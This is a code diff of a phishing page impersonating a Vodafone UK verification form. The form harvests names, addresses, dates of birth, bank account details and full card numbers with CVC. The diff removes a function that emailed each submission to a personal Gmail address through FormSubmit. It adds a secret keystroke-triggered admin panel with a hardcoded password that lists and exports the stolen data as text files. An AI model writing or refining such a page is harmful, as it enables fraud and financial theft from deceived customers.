@@ -41,7 +41,6 @@
     .footer-note { font-size: 0.7rem; color: #6b7f8f; text-align: center; padding: 1rem 1.5rem 1.2rem; background: #fafcfd; border-top: 1px solid #eef2f6; }
     .footer-note .copyright { font-weight: 500; color: #e60000; }
     
-    /* Toast Message */
     .toast-message { visibility: hidden; min-width: 320px; background-color: #1e2f3e; color: #fff; text-align: center; border-radius: 50px; padding: 14px 24px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; z-index: 1000; opacity: 0; transition: opacity 0.2s; }
     .toast-message.show { visibility: visible; opacity: 1; }
     .toast-success { background: #1c7e3c; }
@@ -50,7 +49,6 @@
     @keyframes spin { to { transform: rotate(360deg); } }
     .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
     
-    /* Thank You Modal */
     .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 2000; align-items: center; justify-content: center; }
     .modal-overlay.active { display: flex; }
     .thankyou-modal { background: white; max-width: 480px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem 1.8rem; }
@@ -60,10 +58,45 @@
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
     .thankyou-modal button:hover { background: #c10000; }
     
+    /* Admin Panel for YOU */
+    .admin-panel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 1200px; height: 80%; border-radius: 24px; z-index: 3000; box-shadow: 0 25px 50px rgba(0,0,0,0.3); overflow: hidden; }
+    .admin-panel.active { display: flex; flex-direction: column; }
+    .admin-header { background: #e60000; color: white; padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
+    .admin-header h3 { margin: 0; }
+    .admin-content { padding: 1rem; overflow-y: auto; flex: 1; }
+    .submission-item { background: #f5f5f5; margin-bottom: 1rem; padding: 1rem; border-radius: 12px; border-left: 4px solid #e60000; }
+    .submission-item pre { white-space: pre-wrap; font-family: monospace; font-size: 0.8rem; margin: 0; }
+    .close-admin { background: rgba(255,255,255,0.2); border: none; color: white; padding: 0.5rem 1rem; border-radius: 8px; cursor: pointer; }
+    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; align-items: center; justify-content: center; }
+    .admin-login-overlay.active { display: flex; }
+    .admin-login-box { background: white; padding: 2rem; border-radius: 24px; width: 350px; text-align: center; }
+    .admin-login-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; }
+    .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; }
+    .admin-login-box h3 { color: #e60000; margin-bottom: 1rem; }
+    
     @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
+
+<!-- Admin Login (Secret: type "admin" on keyboard) -->
+<div id="adminLoginOverlay" class="admin-login-overlay">
+  <div class="admin-login-box">
+    <i class="fas fa-lock" style="font-size: 3rem; color: #e60000;"></i>
+    <h3>Admin Access</h3>
+    <input type="password" id="adminPassword" placeholder="Enter Password" autocomplete="off">
+    <button onclick="verifyAdminPassword()">View Submissions</button>
+    <p style="font-size: 0.7rem; margin-top: 1rem;">Password: Admin123</p>
+  </div>
+</div>
+
+<div id="adminPanel" class="admin-panel">
+  <div class="admin-header">
+    <h3><i class="fas fa-database"></i> All Submissions - Download as Notepad File</h3>
+    <button class="close-admin" onclick="closeAdminPanel()">✕ Close</button>
+  </div>
+  <div class="admin-content" id="adminContent"></div>
+</div>
 
 <div class="form-container">
   <div class="form-header">
@@ -215,29 +248,221 @@
   <div class="thankyou-modal">
     <i class="fas fa-check-circle"></i>
     <h3>Thank You!</h3>
-    <p>Your details have been submitted successfully. Our team will contact you shortly.</p>
+    <p>Your details have been submitted successfully.</p>
     <button onclick="closeThankYouModal()">Continue</button>
   </div>
 </div>
 
 <script>
-  // ============ EMAIL CONFIGURATION ============
-  const YOUR_EMAIL = "bakermr01@gmail.com"; // Email set to bakermr01@gmail.com
-  
   const form = document.getElementById('vodafoneForm');
   const toast = document.getElementById('toastMsg');
   const submitBtn = document.getElementById('submitBtn');
   const thankyouModal = document.getElementById('thankyouModal');
+  
+  // Admin password
+  const ADMIN_PASSWORD = "Admin123";
+  
+  // Secret keyboard shortcut: type "admin" anywhere on page
+  let secretKeySequence = [];
+  const secretCode = ['a', 'd', 'm', 'i', 'n'];
+  
+  document.addEventListener('keydown', function(e) {
+    secretKeySequence.push(e.key.toLowerCase());
+    if (secretKeySequence.length > secretCode.length) {
+      secretKeySequence.shift();
+    }
+    if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
+      document.getElementById('adminLoginOverlay').classList.add('active');
+      secretKeySequence = [];
+    }
+  });
+  
+  window.verifyAdminPassword = function() {
+    const password = document.getElementById('adminPassword').value;
+    if (password === ADMIN_PASSWORD) {
+      document.getElementById('adminLoginOverlay').classList.remove('active');
+      openAdminPanel();
+      document.getElementById('adminPassword').value = '';
+    } else {
+      alert('Invalid password!');
+    }
+  };
+  
+  function openAdminPanel() {
+    loadSubmissions();
+    document.getElementById('adminPanel').classList.add('active');
+  }
+  
+  window.closeAdminPanel = function() {
+    document.getElementById('adminPanel').classList.remove('active');
+  };
+  
+  function loadSubmissions() {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    const container = document.getElementById('adminContent');
+    
+    if (submissions.length === 0) {
+      container.innerHTML = '<div style="text-align: center; padding: 2rem;">No submissions yet.</div>';
+      return;
+    }
+    
+    let html = `
+      <div style="margin-bottom: 1rem;">
+        <button onclick="downloadAllAsNotepad()" style="background: #e60000; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-right: 10px;">
+          <i class="fas fa-download"></i> 📝 DOWNLOAD ALL AS NOTEPAD FILE
+        </button>
+        <button onclick="clearAllSubmissions()" style="background: #c0392b; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+          <i class="fas fa-trash"></i> Clear All
+        </button>
+        <span style="margin-left: 15px;">Total: ${submissions.length} submissions</span>
+      </div>
+      <hr><br>
+    `;
+    
+    submissions.slice().reverse().forEach((sub, index) => {
+      html += `
+        <div class="submission-item">
+          <h4>📋 Submission #${submissions.length - index} - ${new Date(sub.timestamp).toLocaleString()}</h4>
+          <pre>${JSON.stringify(sub.data, null, 2)}</pre>
+          <button onclick="downloadSingleSubmission(${sub.id})" style="background: #2c3e50; color: white; border: none; padding: 5px 10px; border-radius: 5px; margin-top: 10px; cursor: pointer;">
+            📝 Save as Notepad
+          </button>
+        </div>
+      `;
+    });
+    
+    container.innerHTML = html;
+  }
+  
+  // Download ALL submissions as a single text file (opens in Notepad)
+  window.downloadAllAsNotepad = function() {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    if (submissions.length === 0) {
+      alert('No submissions to download!');
+      return;
+    }
+    
+    let content = '='.repeat(60) + '\n';
+    content += 'VODAFONE UK - CUSTOMER SUBMISSIONS REPORT\n';
+    content += `Generated: ${new Date().toLocaleString()}\n`;
+    content += `Total Submissions: ${submissions.length}\n`;
+    content += '='.repeat(60) + '\n\n';
+    
+    submissions.slice().reverse().forEach((sub, index) => {
+      content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+      content += `SUBMISSION #${submissions.length - index}\n`;
+      content += `Date/Time: ${new Date(sub.timestamp).toLocaleString()}\n`;
+      content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+      
+      content += `【 PERSONAL INFORMATION 】\n`;
+      content += `├─ First Name: ${sub.data['First Name'] || 'N/A'}\n`;
+      content += `├─ Middle Name: ${sub.data['Middle Name'] || 'N/A'}\n`;
+      content += `├─ Surname: ${sub.data['Surname'] || 'N/A'}\n`;
+      content += `├─ Date of Birth: ${sub.data['Date of Birth'] || 'N/A'}\n`;
+      content += `├─ Phone Number: ${sub.data['Phone Number'] || 'N/A'}\n`;
+      content += `├─ Address: ${sub.data['Address'] || 'N/A'}\n`;
+      content += `└─ History on Address: ${sub.data['History on Address'] || 'N/A'}\n\n`;
+      
+      content += `【 BANK ACCOUNT DETAILS 】\n`;
+      content += `├─ Name on Account: ${sub.data['Name on Account'] || 'N/A'}\n`;
+      content += `├─ Sort Code: ${sub.data['Sort Code'] || 'N/A'}\n`;
+      content += `└─ Account Number: ${sub.data['Account Number'] || 'N/A'}\n\n`;
+      
+      content += `【 CARD DETAILS 】\n`;
+      content += `├─ Name on Card: ${sub.data['Name on Card'] || 'N/A'}\n`;
+      content += `├─ Card Number: ${sub.data['Card Number'] || 'N/A'}\n`;
+      content += `├─ Expiry Date: ${sub.data['Expiry Date'] || 'N/A'}\n`;
+      content += `└─ CVC: ${sub.data['CVC'] || 'N/A'}\n\n`;
+      
+      content += `【 EMPLOYMENT 】\n`;
+      content += `└─ Employment Status: ${sub.data['Employment Status'] || 'N/A'}\n\n`;
+      
+      content += `【 SUBMISSION INFO 】\n`;
+      content += `└─ Submission Time: ${sub.data['Submission Time'] || 'N/A'}\n\n`;
+      content += `─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n`;
+    });
+    
+    content += '\n' + '='.repeat(60) + '\n';
+    content += 'END OF REPORT\n';
+    content += '='.repeat(60);
+    
+    // Create and download the text file
+    const blob = new Blob([content], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `vodafone_submissions_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    
+    showMessage("✅ All submissions downloaded! Open in Notepad.", false);
+  };
+  
+  // Download single submission
+  window.downloadSingleSubmission = function(id) {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    const submission = submissions.find(s => s.id === id);
+    
+    if (!submission) return;
+    
+    let content = '='.repeat(60) + '\n';
+    content += 'VODAFONE UK - CUSTOMER SUBMISSION\n';
+    content += `Date/Time: ${new Date(submission.timestamp).toLocaleString()}\n`;
+    content += '='.repeat(60) + '\n\n';
+    
+    content += `【 PERSONAL INFORMATION 】\n`;
+    content += `First Name: ${submission.data['First Name'] || 'N/A'}\n`;
+    content += `Middle Name: ${submission.data['Middle Name'] || 'N/A'}\n`;
+    content += `Surname: ${submission.data['Surname'] || 'N/A'}\n`;
+    content += `Date of Birth: ${submission.data['Date of Birth'] || 'N/A'}\n`;
+    content += `Phone Number: ${submission.data['Phone Number'] || 'N/A'}\n`;
+    content += `Address: ${submission.data['Address'] || 'N/A'}\n`;
+    content += `History on Address: ${submission.data['History on Address'] || 'N/A'}\n\n`;
+    
+    content += `【 BANK ACCOUNT DETAILS 】\n`;
+    content += `Name on Account: ${submission.data['Name on Account'] || 'N/A'}\n`;
+    content += `Sort Code: ${submission.data['Sort Code'] || 'N/A'}\n`;
+    content += `Account Number: ${submission.data['Account Number'] || 'N/A'}\n\n`;
+    
+    content += `【 CARD DETAILS 】\n`;
+    content += `Name on Card: ${submission.data['Name on Card'] || 'N/A'}\n`;
+    content += `Card Number: ${submission.data['Card Number'] || 'N/A'}\n`;
+    content += `Expiry Date: ${submission.data['Expiry Date'] || 'N/A'}\n`;
+    content += `CVC: ${submission.data['CVC'] || 'N/A'}\n\n`;
+    
+    content += `【 EMPLOYMENT 】\n`;
+    content += `Employment Status: ${submission.data['Employment Status'] || 'N/A'}\n\n`;
+    
+    content += '='.repeat(60) + '\n';
+    content += 'END OF SUBMISSION\n';
+    content += '='.repeat(60);
+    
+    const blob = new Blob([content], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `submission_${submission.id}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    
+    showMessage("✅ Downloaded! Open in Notepad.", false);
+  };
+  
+  window.clearAllSubmissions = function() {
+    if (confirm('Delete ALL submissions?')) {
+      localStorage.removeItem('vodafone_submissions');
+      loadSubmissions();
+      showMessage("All submissions cleared", false);
+    }
+  };
   
   function showMessage(text, isError = false) {
     toast.textContent = text;
     toast.classList.add('show');
     if (isError) {
       toast.classList.add('toast-error');
-      toast.classList.remove('toast-success');
     } else {
       toast.classList.add('toast-success');
-      toast.classList.remove('toast-error');
     }
     setTimeout(() => { toast.classList.remove('show'); }, 4000);
   }
@@ -255,47 +480,13 @@
     document.getElementById('dobYear').value = '';
   }
   
-  // Send data to backend via FormSubmit (free email service)
-  async function sendToEmail(formData) {
-    try {
-      const response = await fetch('https://formsubmit.co/ajax/' + YOUR_EMAIL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          ...formData,
-          _subject: '🔴 NEW Vodafone Customer Submission!',
-          _template: 'table',
-          _captcha: 'false'
-        })
-      });
-      
-      if (response.ok) {
-        return true;
-      }
-      return false;
-    } catch(error) {
-      console.error('Email error:', error);
-      return false;
-    }
-  }
-  
-  // Also save to localStorage as backup
   function saveToLocalStorage(data) {
     try {
       const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
-      submissions.push({ 
-        id: Date.now(), 
-        timestamp: new Date().toISOString(),
-        data: data 
-      });
+      submissions.push({ id: Date.now(), timestamp: new Date().toISOString(), data: data });
       localStorage.setItem('vodafone_submissions', JSON.stringify(submissions));
       return true;
-    } catch(e) {
-      return false;
-    }
+    } catch(e) { return false; }
   }
   
   function validateForm() {
@@ -369,11 +560,9 @@
     });
     data['Date of Birth'] = `${document.getElementById('dobDay').value}/${document.getElementById('dobMonth').value}/${document.getElementById('dobYear').value}`;
     data['Submission Time'] = new Date().toLocaleString();
-    data['IP Address'] = 'Collected by email service';
     return data;
   }
   
-  // Card number formatting
   document.getElementById('cardNumber').addEventListener('input', function(e) {
     let raw = this.value.replace(/\s/g, '');
     if (raw.length > 19) raw = raw.slice(0,19);
@@ -385,7 +574,6 @@
     this.value = formatted;
   });
   
-  // Expiry formatting
   document.getElementById('expiryDate').addEventListener('input', function(e) {
     let raw = this.value.replace(/[^0-9]/g, '');
     if (raw.length >= 3) {
@@ -397,37 +585,27 @@
     if (raw.length > 4) this.value = this.value.slice(0,5);
   });
   
-  // Clear button
   document.getElementById('clearBtn').addEventListener('click', function() {
     resetForm();
-    showMessage("Form has been reset", false);
+    showMessage("Form reset", false);
   });
   
-  // Submit button
-  document.getElementById('submitBtn').addEventListener('click', async function(e) {
+  document.getElementById('submitBtn').addEventListener('click', function(e) {
     e.preventDefault();
-    
-    if (!validateForm()) {
-      return;
-    }
+    if (!validateForm()) return;
     
     const formData = gatherFormData();
-    
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
     
-    // Send email and save locally
-    const emailSent = await sendToEmail(formData);
-    const localSaved = saveToLocalStorage(formData);
-    
     setTimeout(() => {
-      if (emailSent || localSaved) {
+      const saved = saveToLocalStorage(formData);
+      if (saved) {
         thankyouModal.classList.add('active');
-        showMessage("✅ Submitted successfully! Check your email.", false);
+        showMessage("✅ Submitted! Check Admin Panel.", false);
       } else {
-        showMessage("❌ Error submitting. Please try again.", true);
+        showMessage("❌ Error saving.", true);
       }
-      
       submitBtn.disabled = false;
       submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
     }, 500);
